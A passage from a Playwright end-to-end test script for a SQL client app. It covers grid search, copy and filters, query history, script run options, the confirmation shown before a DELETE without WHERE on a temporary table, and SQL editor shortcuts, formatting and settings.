  await findStatus.getByText("3 of 15", { exact: true }).waitFor();
  await page.keyboard.press("Shift+F3");
  await page.keyboard.press("Shift+F3");
  await page.keyboard.press("Shift+F3");
  // Before the first comes the last.
  await findStatus.getByText("15 of 15", { exact: true }).waitFor();
  await shot("04b5-grid-find");
  // Hidden columns are not searched.
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 18, { button: "right" });
  await headerMenu.getByRole("menuitem", { name: "Hide id" }).click();
  await findStatus.getByText("No results", { exact: true }).waitFor();
  await hiddenButton.click();
  await chooser.getByRole("button", { name: "Show all" }).click();
  await page.keyboard.press("Escape");
  await findStatus.getByText(/^\d+ of 15$/).waitFor();
  await findBar.getByRole("searchbox").focus();
  await page.keyboard.press("Escape");
  await findBar.waitFor({ state: "detached" });

  step("copy: an HTML table, column names quoted, and every value of a column as an IN list");
  // The search scrolled to its last match: back to the first rows.
  await sortGrid.evaluate((el) => {
    el.scrollTop = 0;
    el.scrollLeft = 0;
  });
  await page.waitForTimeout(100);
  await topLeftCell();
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Shift+ArrowDown");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12, { button: "right" });
  const cellMenu = panel.locator(".result-grid-menu");
  {
    const before = await page.evaluate(() => window.__copied.length);
    await cellMenu.getByRole("menuitem", { name: "Copy ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Copy as HTML table" }).click();
    const html = await copied(before + 1);
    assert.ok(html.startsWith("<table>\n  <thead>\n    <tr><th>id</th><th>customer_id</th></tr>"), html);
    assert.match(html, /<tr><td>1<\/td><td>\d+<\/td><\/tr>\n    <tr><td>2<\/td>/);
  }
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12, { button: "right" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await cellMenu.getByRole("menuitem", { name: "Copy column names ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Quoted for this database" }).click();
    assert.equal(await copied(before + 1), '"id", "customer_id"');
  }
  await page.mouse.click(sortBox.x + CUSTOMER_X, sortBox.y + 18, { button: "right" });
  {
    const before = await page.evaluate(() => window.__copied.length);
    await headerMenu.getByRole("menuitem", { name: "Copy all values as SQL IN list" }).click();
    const list = await copied(before + 1);
    assert.match(list, /^\(\d+(, \d+)*\)$/);
    const values = list.slice(1, -1).split(", ");
    assert.equal(new Set(values).size, values.length, "each customer once");
    assert.ok(values.length > 100 && values.length <= 500, `${values.length} customers`);
  }

  step("filter by this value: contains, from the cell menu, on the loaded rows");
  await page.mouse.click(sortBox.x + ID_X, sortBox.y + 34 + 12, { button: "right" });
  await cellMenu.getByRole("menuitem", { name: "Filter ▸" }).hover();
  await panel.getByRole("menuitem", { name: "id contains '1'" }).click();
  await panel.locator(".filter-chip", { hasText: "id contains '1'" }).waitFor();
  await panel.locator(".statusline", { hasText: /^[\d,]+ of 50,000 rows/ }).waitFor();
  await panel.getByRole("button", { name: "Reset filters" }).click();
  await panel.locator(".statusline", { hasText: /^50,000 rows/ }).waitFor();

  step("filter: the core keeps the rows with the text, sorting and copy follow");
  const filterBox = panel.getByRole("searchbox", { name: "Filter rows" });
  await filterBox.fill("4999");
  await panel.locator(".statusline", { hasText: "15 of 50,000 rows" }).waitFor();
  assert.deepEqual(await copyFirstRows(0, 3), ["4999", "14999", "24999"]);
  // Two quick clicks: the second cycles from the first even before the core answers.
  await clickHeader(ID_X);
  await clickHeader(ID_X);
  await panel.locator('.grid-scroller[aria-label="Result with 15 rows, sorted by id, descending"]').waitFor();
  assert.deepEqual(await copyFirstRows(0, 2), ["49999", "49998"]);
  await shot("04c-grid-filtered");
  await filterBox.press("Escape");
  await panel.locator(".statusline", { hasText: "50,000 rows" }).waitFor();
  await clickHeader(ID_X);
  await sortedAs("");

  step("error with its position underlined");
  panel = await newQuery("Shop (SQLite)", "select id, total\nfrom ordrs\nwhere total > 100;");
  await run(panel);
  await panel.locator(".messages", { hasText: "ordrs" }).waitFor();
  await panel.locator(".cm-lintRange-error").waitFor();
  await setLanguage("es");
  await panel.locator(".error-box", { hasText: "no such table: ordrs" }).waitFor();
  await page.getByRole("button", { name: "Historial de consultas", exact: true }).waitFor();
  await setLanguage("en");
  await shot("05-error");

  step("history: successes, errors, search and reopening without execution");
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  let history = page.getByRole("complementary", { name: "Query history", exact: true });
  await waitForHistoryCount(4);
  const errorEntry = history.locator(".history-entry").filter({ has: page.locator(".history-sql", { hasText: "from ordrs" }) });
  await errorEntry.getByText("Error details", { exact: true }).click();
  await errorEntry.locator(".history-error", { hasText: "ordrs" }).waitFor();
  await errorEntry.getByText("0 rows returned", { exact: true }).waitFor();
  const aggregateEntry = history.locator(".history-entry").filter({ has: page.locator(".history-sql", { hasText: "group by c.country" }) });
  await aggregateEntry.getByText("6 rows returned", { exact: true }).waitFor();
  assert.match(await aggregateEntry.locator(".history-meta").innerText(), /\d+ ms/);
  assert.ok(await aggregateEntry.locator("time").getAttribute("datetime"));
  await history.getByRole("textbox", { name: "Search query history" }).fill("ORDRS");
  await waitForHistoryCount(1);
  await history.getByText("Error details", { exact: true }).click();
  await history.locator(".history-error", { hasText: "ordrs" }).waitFor();
  await history.getByRole("textbox", { name: "Search query history" }).fill("round");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "group by c.country" }).waitFor();
  const reopenedSql = await history.locator(".history-sql").innerText();
  const tabsBefore = await page.getByRole("tab").count();
  await shot("05a-history");
  await history.getByRole("button", { name: "Open in new tab" }).click();
  panel = page.locator(".tab-panel:not([hidden])");
  assert.equal(await page.getByRole("tab").count(), tabsBefore + 1);
  assert.equal(await panel.locator(".cm-content").innerText(), reopenedSql);
  await panel.getByText("Disconnected", { exact: true }).waitFor();
  await panel.getByText("Write a query and press Ctrl+Enter.", { exact: true }).waitFor();
  assert.equal(await panel.locator(".grid-host").count(), 0);
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await waitForHistoryCount(4);
  await page.getByRole("button", { name: "Close query history" }).click();

  step("history disabled: successful and failed SQL leave no entries");
  await setHistorySaving("Shop (SQLite)", false, "sdb-102-history-option");
  assert.equal(await panel.getByRole("checkbox").count(), 0, "the editor toolbar no longer has the history checkbox");
  await replaceQuery(panel, "select 'private_history_marker' as secret;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await replaceQuery(panel, "select private_error_marker from no_history_private_table;");
  await run(panel);
  await panel.locator(".messages", { hasText: "no_history_private_table" }).waitFor();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await waitForHistoryCount(4);
  await history.getByRole("textbox", { name: "Search query history" }).fill("private");
  await history.getByText("No matching queries.", { exact: true }).waitFor();
  await shot("05b-history-disabled");
  await page.getByRole("button", { name: "Close query history" }).click();

  step("Ctrl+Enter runs the statement under the cursor, Ctrl+Shift+Enter all of them");
  await replaceQuery(panel, "select 'first' as which;\nselect 'second;' as which;\n\n-- the third\nselect 'third' as which");
  const firstCell = async () => {
    // Between two runs the grid is replaced: wait until the new one is there.
    const grid = panel.locator(".grid-scroller");
    await grid.waitFor();
    let box = await grid.boundingBox();
    for (let i = 0; i < 40 && !box; i++) {
      await page.waitForTimeout(100);
      box = await grid.boundingBox();
    }
    const before = await page.evaluate(() => window.__copied.length);
    await page.mouse.click(box.x + 80, box.y + 34 + 12);
    await page.keyboard.press("Control+c");
    return (await copied(before + 1)).trimEnd();
  };
  const sqlEditor = panel.locator(".cm-content");
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("End");
  await page.keyboard.press("Control+Enter");
  await panel.locator(".cm-ran", { hasText: "select 'second;' as which" }).waitFor();
  await shot("05c-statement-under-cursor");
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.equal(await panel.locator(".result-tabs button", { hasText: /^Result/ }).count(), 1);
  assert.equal(await firstCell(), "second;");
  await sqlEditor.click();
  await page.keyboard.press("Control+End");
  await page.keyboard.press("Control+Enter");
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.waitForFunction(() => document.querySelector(".cm-ran")?.textContent?.includes("-- the third"));
  // The status line already says "1 row" from the previous run: wait for the new value.
  let third = "";
  for (let i = 0; i < 20 && third !== "third"; i++) {
    third = await firstCell();
    if (third !== "third") await page.waitForTimeout(250);
  }
  assert.equal(third, "third");

  step("editor toolbar: run the current statement or selection, and run the whole script");
  const actions = panel.getByRole("toolbar", { name: "Query actions" });
  assert.deepEqual(await actions.getByRole("button").evaluateAll((buttons) => buttons.map((button) => button.getAttribute("aria-label"))), ["Run", "Run script", "Run options", "Explain query", "Editor actions", "Format", "Save", "Save as file"]);
  for (const button of await actions.getByRole("button").all()) assert.ok(await button.getAttribute("title"));
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("End");
  let previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await actions.getByRole("button", { name: "Run", exact: true }).click();
  await page.waitForFunction((button) => !button.isConnected, previousResult);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  let selected = "";
  for (let i = 0; i < 20 && selected !== "second;"; i++) {
    selected = await firstCell();
    if (selected !== "second;") await page.waitForTimeout(250);
  }
  assert.equal(selected, "second;");
  assert.equal(await panel.locator(".result-tabs button", { hasText: /^Result/ }).count(), 1);
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+End");
  previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await actions.getByRole("button", { name: "Run", exact: true }).click();
  await page.waitForFunction((button) => !button.isConnected, previousResult);
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  selected = "";
  for (let i = 0; i < 20 && selected !== "first"; i++) {
    selected = await firstCell();
    if (selected !== "first") await page.waitForTimeout(250);
  }
  assert.equal(selected, "first");
  await sqlEditor.click();
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+End");
  await actions.getByRole("button", { name: "Run script", exact: true }).click();
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();
  await sqlEditor.click();
  await page.keyboard.press("Control+Shift+Enter");
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();

  step("risky statements: the core asks before a DELETE without WHERE runs");
  await replaceQuery(panel, "create temp table scratch (x);\ninsert into scratch values (1), (2);\ndelete from scratch;");
  await run(panel);
  let risk = page.getByRole("dialog", { name: "Run these statements?" });
  await risk.getByText("DELETE without WHERE: deletes every row").waitFor();
  assert.equal(await risk.locator(".risk-list li").count(), 1);
  assert.equal(await risk.locator(".risk-list pre").innerText(), "delete from scratch");
  // Cancel has the focus, so a reflex Enter does not run it.
  await page.keyboard.press("Enter");
  await risk.waitFor({ state: "detached" });
  await panel.locator(".result-tabs button", { hasText: "Result 3" }).waitFor();
  // A personal pause before "Run anyway" (Settings → Scripts): the button counts down first.
  await withSettings("scripts", async (settings) => {
    const delay = settings.locator('input[name="scriptConfirmDelay"]');
    await delay.fill("2");
    await delay.press("Enter");
    await page.waitForFunction(() => !document.querySelector('input[name="scriptConfirmDelay"]')?.matches(":disabled"));
  });
  await actions.getByRole("button", { name: "Run script", exact: true }).click();
  risk = page.getByRole("dialog", { name: "Run these statements?" });
  const runAnyway = risk.getByRole("button", { name: /^Run anyway/ });
  assert.match(await runAnyway.innerText(), /^Run anyway \([12]\)$/);
  assert.ok(await runAnyway.isDisabled(), "disabled during the pause");
  await shot("sdb-13-run-anyway-pause");
  await risk.getByRole("button", { name: "Run anyway", exact: true }).waitFor();
  await shot("05d-risky-statements");
  await risk.getByRole("button", { name: "Run anyway", exact: true }).click();
  await risk.waitFor({ state: "detached" });
  await withSettings("scripts", async (settings) => {
    const delay = settings.locator('input[name="scriptConfirmDelay"]');
    await delay.fill("0");
    await delay.press("Enter");
    await page.waitForFunction(() => !document.querySelector('input[name="scriptConfirmDelay"]')?.matches(":disabled"));
  });
  await panel.getByText("Statement 3: 2 rows", { exact: false }).waitFor();

  step("script runs: continue, ask (skip, stop), the summary, and the guard in every mode");
  // The tab's run options choose; the core runs the statements and counts them (ADR-035).
  async function runOptions(choose) {
    await actions.getByRole("button", { name: "Run options" }).click();
    const options = page.getByRole("dialog", { name: "Run options for this tab" });
    await options.waitFor();
    await choose(options);
    await page.keyboard.press("Escape");
    await options.waitFor({ state: "detached" });
  }
  async function showMessages() {
    await panel.locator(".result-tabs button", { hasText: /^Messages/ }).click();
  }
  await runOptions((options) => options.getByRole("radio", { name: "Continue", exact: true }).check());
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Continue/);
  await replaceQuery(panel, "create temp table runs (id integer primary key);\ninsert into runs values (1);\ninsert into runs values (1);\ninsert into runs values (2);\nselect count(*) from runs;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "4 OK, 1 failed, 0 not run" }).waitFor();
  await showMessages();
  await panel.getByText("Statement 3: UNIQUE constraint failed", { exact: false }).waitFor();
  await panel.getByText("5 statements: 4 OK, 1 failed, 0 not run", { exact: false }).waitFor();
  await panel.getByText("Statement 4: 1 row (", { exact: false }).waitFor();
  assert.ok(await panel.getByText(/ms execute, \d+ ms fetch/).first().isVisible(), "timing split into execute and fetch");
  // Continue never skips the confirmation of a risky statement.
  await replaceQuery(panel, "delete from runs;\nselect 1;");
  await run(panel);
  risk = page.getByRole("dialog", { name: "Run these statements?" });
  await risk.getByText("DELETE without WHERE: deletes every row").waitFor();
  await risk.getByRole("button", { name: "Cancel" }).click();
  await risk.waitFor({ state: "detached" });
  // Ask: the run pauses on the error and waits for the answer.
  await runOptions((options) => options.getByRole("radio", { name: "Ask", exact: true }).check());
  await replaceQuery(panel, "insert into runs values (2);\nselect 1;\nselect 2;");
  await run(panel);
  let paused = page.getByRole("dialog", { name: "Statement 1 failed" });
  await paused.getByText("2 statements after it have not run yet.").waitFor();
  await paused.getByText("UNIQUE constraint failed", { exact: false }).waitFor();
  await shot("05e-script-error-ask");
  await paused.getByRole("button", { name: "Skip and continue" }).click();
  await paused.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "2 OK, 1 failed, 0 not run" }).waitFor();
  // Stop has the focus; Escape stops too.
  await run(panel);
  paused = page.getByRole("dialog", { name: "Statement 1 failed" });
  await paused.waitFor();
  await page.keyboard.press("Escape");
  await paused.waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: "0 OK, 1 failed, 2 not run" }).waitFor();
  await showMessages();
  await panel.getByText("Stopped at statement 1, which failed.").waitFor();
  // A statement timeout of this tab: the endless query is cancelled and the run goes on.
  await runOptions(async (options) => {
    await options.getByRole("radio", { name: "Continue", exact: true }).check();
    await options.getByLabel("Statement timeout (seconds)").fill("1");
    await options.getByLabel("Statement timeout (seconds)").press("Enter");
  });
  await replaceQuery(panel, "with recursive r(i) as (select 1 union all select i + 1 from r) select count(*) from r;\nselect 'after the timeout';");
  await run(panel);
  await panel.locator(".statusline", { hasText: "1 OK, 1 failed, 0 not run" }).waitFor({ timeout: 30_000 });
  await showMessages();
  await panel.getByText("Statement 1: timed out.", { exact: false }).waitFor();
  await runOptions((options) => options.getByRole("button", { name: "Use the defaults" }).click());
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Stop/);
  // The default comes from Settings › Scripts.
  await withSettings("scripts", async (settings) => {
    await settings.getByRole("radio", { name: "Continue with the next statement" }).check();
    await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="continue"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
    assert.equal(await settings.getByRole("checkbox", { name: /Notify me when a long run finishes/ }).isChecked(), false, "notifications are opt-in");
  });
  assert.match(await actions.getByRole("button", { name: "Run options" }).getAttribute("title"), /Continue/);
  await withSettings("scripts", async (settings) => {
    await settings.getByRole("radio", { name: "Stop the script" }).check();
    await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="stop"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
  });

  // Two runs paused on an error at once ask one after the other (SDB-139): each tab gets its own
  // question, named after the tab, and answering the first shows the second instead of leaving
  // a run paused with no question.
  {
    const original = await page.locator(".tabbar .tab.active").getAttribute("id");
    await withSettings("scripts", async (settings) => {
      await settings.getByRole("radio", { name: "Ask: stop, skip or skip all" }).check();
      await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="ask"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
    });
    // Tab A counts for a few seconds before its failing statement; tab B fails at once.
    const slowA = await newQuery(
      "Shop (SQLite)",
      "with recursive r(i) as (select 1 union all select i + 1 from r where i < 10000000) select count(*) from r;\nselect * from no_such_table_a;\nselect 1;",
    );
    const tabA = page.locator(".tabbar .tab.active");
    const idA = await tabA.getAttribute("id");
    const labelA = await tabA.getAttribute("title");
    await newQuery("Shop (SQLite)", "select * from no_such_table_b;\nselect 2;");
    const tabB = page.locator(".tabbar .tab.active");
    const idB = await tabB.getAttribute("id");
    const labelB = await tabB.getAttribute("title");
    await page.locator(`#${idA}`).click();
    await run(slowA);
    await page.locator(`#${idB}`).click();
    await run(page.locator(".tab-panel:not([hidden])"));
    const askedB = page.getByRole("dialog", { name: `Statement 1 failed in ${labelB}` });
    await askedB.getByText("no such table: no_such_table_b", { exact: false }).waitFor();
    // Tab A fails while B's question is open: its question waits behind it.
    // A paused run still counts as running, so there is nothing to wait for but its count
    // (a few seconds); whenever it fails, its question can only come after B's is answered.
    await page.waitForTimeout(15_000);
    assert.equal(await page.getByRole("dialog", { name: `Statement 2 failed in ${labelA}` }).count(), 0, "A's question waits for its turn");
    await shot("sdb-139-two-paused-runs-first");
    await askedB.getByRole("button", { name: "Skip and continue" }).click();
    const askedA = page.getByRole("dialog", { name: `Statement 2 failed in ${labelA}` });
    await askedA.getByText("no such table: no_such_table_a", { exact: false }).waitFor();
    await askedA.getByText("1 statement after it has not run yet.").waitFor();
    // Settings cannot open over a question: the dark look is put on the page for the
    // screenshot alone, as the theme setting does (preferences.ts applyTheme: the attribute,
    // then the event the grid repaints on), and taken off again.
    const lookOf = (theme) =>
      page.evaluate((value) => {
        document.documentElement.dataset.theme = value;
        window.dispatchEvent(new Event("spelaion-themechange"));
      }, theme);
    await lookOf("dark");
    await shot("sdb-139-two-paused-runs-second-dark");
    await lookOf("light");
    await askedA.getByRole("button", { name: "Stop" }).click();
    await askedA.waitFor({ state: "detached" });
    // Both runs ended as answered.
    await page.locator(".tab-panel:not([hidden]) .statusline", { hasText: "1 OK, 1 failed, 0 not run" }).waitFor();
    await page.locator(`#${idA}`).click();
    await page.locator(".tab-panel:not([hidden]) .statusline", { hasText: "1 OK, 1 failed, 1 not run" }).waitFor();
    for (const id of [idA, idB]) {
      await page.locator(`#${id}`).click();
      await page.locator(".tabbar .tab.active .close").click();
      await page.locator(`#${id}`).waitFor({ state: "detached" });
    }
    await page.locator(`#${original}`).click();
    await withSettings("scripts", async (settings) => {
      await settings.getByRole("radio", { name: "Stop the script" }).check();
      await page.waitForFunction(() => document.querySelector('input[name="scriptOnError"][value="stop"]')?.checked && !document.querySelector('input[name="scriptOnError"]')?.matches(":disabled"));
    });
  }

  step("SQL editor: VS Code line and multi-cursor shortcuts");
  await replaceQuery(panel, "first\nsecond");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+Alt+ArrowDown");
  assert.equal(await sqlEditor.innerText(), "first\nfirst\nsecond");
  await page.keyboard.press("Control+z");
  assert.equal(await sqlEditor.innerText(), "first\nsecond");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+Alt+ArrowDown");
  await page.keyboard.insertText("x");
  assert.equal(await sqlEditor.innerText(), "xfirst\nxsecond");

  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+d");
  await page.keyboard.press("Control+d");
  await page.keyboard.insertText("item");
  assert.equal(await sqlEditor.innerText(), "item item words word");
  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Control+Shift+l");
  await page.keyboard.insertText("item");
  assert.equal(await sqlEditor.innerText(), "item item words item");
  await replaceQuery(panel, "word word words word");
  await page.keyboard.press("Control+Home");
  await page.keyboard.press("Shift+ArrowRight");
  await page.keyboard.press("Control+Shift+l");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xord Xord Xords Xord");

  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  const linePoint = async (lineIndex, offset) => panel.locator(".cm-line").nth(lineIndex).evaluate((line, index) => {
    const walker = document.createTreeWalker(line, NodeFilter.SHOW_TEXT);
    let node = walker.nextNode();
    let remaining = index;
    while (node && remaining > node.textContent.length) {
      remaining -= node.textContent.length;
      node = walker.nextNode();
    }
    const range = document.createRange();
    range.setStart(node, remaining);
    range.collapse(true);
    const box = range.getBoundingClientRect();
    return { x: box.left, y: (box.top + box.bottom) / 2 };
  }, offset);
  let firstPoint = await linePoint(0, 0);
  let secondPoint = await linePoint(1, 0);
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Alt");
  await page.mouse.click(secondPoint.x, secondPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaaaa\nXbbbb\ncccc");

  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  const lastPoint = await linePoint(2, 2);
  await page.mouse.move(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.down();
  await page.mouse.move(lastPoint.x, lastPoint.y, { steps: 5 });
  await page.mouse.up();
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  // A normal click followed by Shift+Alt+click uses the first position as the anchor.
  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  let endPoint = await linePoint(2, 2);
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.click(endPoint.x, endPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  // Both endpoints can also be clicked while keeping the modifiers pressed.
  await replaceQuery(panel, "aaaa\nbbbb\ncccc");
  firstPoint = await linePoint(0, 0);
  endPoint = await linePoint(2, 2);
  await page.keyboard.down("Shift");
  await page.keyboard.down("Alt");
  await page.mouse.click(firstPoint.x, firstPoint.y);
  await page.mouse.click(endPoint.x, endPoint.y);
  await page.keyboard.up("Alt");
  await page.keyboard.up("Shift");
  await page.keyboard.insertText("X");
  assert.equal(await sqlEditor.innerText(), "Xaa\nXbb\nXcc");

  step("format: Shift+Alt+F and the Format button, one undo step, errors shown");
  await replaceQuery(panel, "select id, total from orders where total > 100 and id < 5");
  await page.keyboard.press("Shift+Alt+F");
  const formatted = "select\n  id,\n  total\nfrom\n  orders\nwhere\n  total > 100\n  and id < 5";
  for (let i = 0; i < 20 && (await sqlEditor.innerText()) !== formatted; i++) await page.waitForTimeout(100);
  assert.equal(await sqlEditor.innerText(), formatted);
  await shot("05e-formatted");
  await page.keyboard.press("Control+z");
  assert.equal(await sqlEditor.innerText(), "select id, total from orders where total > 100 and id < 5");
  await replaceQuery(panel, "select 'unterminated");
  await panel.getByRole("button", { name: "Format", exact: true }).click();
  await panel.getByRole("alert").filter({ hasText: "Could not format" }).waitFor();
  assert.equal(await sqlEditor.innerText(), "select 'unterminated");

  step("editor actions: keyboard menu, snippets, comments, transforms and core statement selection");
  {
    const menu = page.getByRole("menu", { name: "Editor actions" });
    const editorText = async (text) => { await page.waitForFunction((expected) => [...document.querySelectorAll('.tab-panel:not([hidden]) .cm-content .cm-line')].map((line) => line.textContent).join("\n") === expected, text); };
    const menuAction = async (name) => {
      await panel.getByRole("button", { name: "Editor actions", exact: true }).click();
      await menu.getByRole("menuitem", { name, exact: true }).click();
    };
    await replaceQuery(panel, "select 'before' as value;");
    await shot("05e-editor-initial-light");
    await setTheme("dark", "dark");
    await shot("05e-editor-initial-dark");
    await setTheme("light", "light");
    await replaceQuery(panel, "sel");
    await page.keyboard.press("Tab");
    await editorText("SELECT columns FROM table;");
    await page.keyboard.insertText("id");
    await page.keyboard.press("Tab");
    await page.keyboard.insertText("orders");
    await editorText("SELECT id FROM orders;");
    await page.keyboard.press("Shift+Tab");
    await page.waitForFunction(() => getSelection().toString() === "id");
    await replaceQuery(panel, "select 'α;β' as value;\nselect 2;");
    await page.keyboard.press("Control+Home");
    await menuAction("Select current statement");
    await page.waitForFunction(() => getSelection().toString() === "select 'α;β' as value");
    const before = await page.evaluate(() => window.__copied.length);
    await menuAction("Copy current statement");
    assert.equal(await copied(before + 1), "select 'α;β' as value");
    await page.evaluate(() => { window.__savedClipboardWrite = navigator.clipboard.writeText; navigator.clipboard.writeText = async () => { throw new Error("Clipboard access refused"); }; });
    await menuAction("Copy current statement");
    await panel.getByRole("alert").filter({ hasText: "Could not perform editor action: Clipboard access refused" }).waitFor();
    await page.evaluate(() => { navigator.clipboard.writeText = window.__savedClipboardWrite; });
    await replaceQuery(panel, "select id from orders");
    await page.keyboard.press("Control+/");
    await editorText("-- select id from orders");
    await menuAction("Toggle line comment");
    await editorText("select id from orders");
    await page.keyboard.press("Control+A");
    await menuAction("Toggle block comment");
    assert.match(await sqlEditor.innerText(), /^\/\*/);
    await page.keyboard.press("Control+z");
    await page.keyboard.press("Control+A");
    await menuAction("Convert to upper case");
    await editorText("SELECT ID FROM ORDERS");
    await menuAction("Convert to lower case");
    await editorText("select id from orders");
    await replaceQuery(panel, "O'Reilly\n漢字\n");
    await page.keyboard.press("Control+A");
    await menuAction("Lines to quoted list");
    await editorText("'O''Reilly', '漢字', ''");
    await page.keyboard.press("Control+z");
    await editorText("O'Reilly\n漢字\n");
    await replaceQuery(panel, "");
    await page.keyboard.type("(");
    await editorText("()");
    await replaceQuery(panel, "SELECT (\n  SELECT 1\n);");
    await page.keyboard.press("Control+Home");
    await menuAction("Fold selection");
    await panel.locator(".cm-foldPlaceholder").waitFor();
    await menuAction("Unfold selection");
    await panel.locator(".cm-foldPlaceholder").waitFor({ state: "detached" });
    await replaceQuery(panel, "(select 1)");
    await page.keyboard.press("Control+Home");
    await menuAction("Go to matching bracket");
    await page.keyboard.insertText("X");
    await editorText("(select 1)X");
    await replaceQuery(panel, "orders orders orders");
    await page.keyboard.press("Control+Home");
    await page.keyboard.press("ArrowRight");
    await page.waitForFunction(() => document.querySelectorAll('.tab-panel:not([hidden]) .cm-selectionMatch').length === 3);
    await sqlEditor.focus();
    await page.keyboard.press("Shift+F10");
    await menu.waitFor();
    await page.keyboard.press("End");
    assert.equal(await page.evaluate(() => document.activeElement.textContent.includes("Insert UPDATE")), true);
    await page.keyboard.press("Escape");
    assert.equal(await sqlEditor.evaluate((el) => el === document.activeElement), true);
    await withSettings("editor", async (settings) => {
      const choose = async (name, value) => { const input = settings.locator(`[name="${name}"]`); await input.selectOption(value); await page.waitForFunction((name) => !document.querySelector(`[name="${name}"]`).disabled, name); };
      await choose("editorFont", "Consolas");
      await choose("editor-fontSize", "16");
      await choose("editor-lineHeight", "24");
      await choose("editor-tabSize", "4");
      await choose("editor-keywordCase", "upper");
      await choose("editor-indent", "4");
      await choose("editor-commaPosition", "leading");
      await shot("05e-editor-settings-light");
    });
    await replaceQuery(panel, "select id, total from orders");
    await page.keyboard.press("Shift+Alt+F");
    await editorText("SELECT\n    id\n    , total\nFROM\n    orders");
    assert.equal(await sqlEditor.evaluate((el) => getComputedStyle(el.closest('.cm-editor')).fontSize), "16px");
    await page.keyboard.press("Alt+z");
    await page.waitForFunction(() => document.querySelector('.tab-panel:not([hidden]) .cm-lineWrapping') !== null);
    await panel.getByRole("button", { name: "Editor actions", exact: true }).click();
    await shot("05e-editor-actions-light");
    await page.keyboard.press("Escape");
    await setTheme("dark", "dark");
    await panel.getByRole("button", { name: "Editor actions", exact: true }).click();
    await shot("05e-editor-actions-dark");
    await page.keyboard.press("Escape");
    await withSettings("editor", async () => { await shot("05e-editor-settings-dark"); });
    await setTheme("light", "light");
    await withSettings("editor", async (settings) => {
      const choose = async (name, value) => { const input = settings.locator(`[name="${name}"]`); await input.selectOption(value); await page.waitForFunction((name) => !document.querySelector(`[name="${name}"]`).disabled, name); };
      await choose("editorFont", "system"); await choose("editor-fontSize", "13"); await choose("editor-lineHeight", "18");
      await choose("editor-tabSize", "2"); await choose("editor-keywordCase", "preserve"); await choose("editor-indent", "2"); await choose("editor-commaPosition", "trailing");
      await settings.locator('[name="editor-wordWrap"]').click();
      await page.waitForFunction(() => { const input = document.querySelector('[name="editor-wordWrap"]'); return !input.checked && !input.disabled; });
    });
    for (const theme of ["light", "dark"]) {
      await setTheme(theme, theme);
      await replaceQuery(panel, "select total from orders");
      await page.keyboard.press("Control+A");
      await page.keyboard.press("Control+Shift+P");
      const editorPalette = page.getByRole("dialog", { name: "Command palette" });
      await editorPalette.getByRole("combobox").fill("convert upper");
      const action = editorPalette.locator('[data-command="editor.upperCase"]');
      await action.waitFor();
      assert.equal(await action.locator(".menu-shortcut").innerText(), "Ctrl+Shift+Alt+U");
      await shot(`05e-editor-palette-${theme}`);
      await page.keyboard.press("Enter");
